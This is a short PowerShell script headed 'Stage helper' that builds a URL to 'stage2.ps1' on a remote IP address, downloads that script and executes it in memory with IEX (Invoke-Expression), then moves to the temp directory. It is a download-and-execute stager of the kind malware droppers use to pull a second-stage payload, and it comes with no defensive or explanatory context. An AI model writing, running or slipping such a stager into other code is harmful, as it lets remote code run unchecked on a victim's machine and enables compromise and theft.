
# Stage helper
$TargetUrl = "http://203.0.113.50/stage2.ps1"
IEX (Invoke-WebRequest -Uri $TargetUrl -UseBasicParsing).Content
Set-Location -Path $env:TEMP
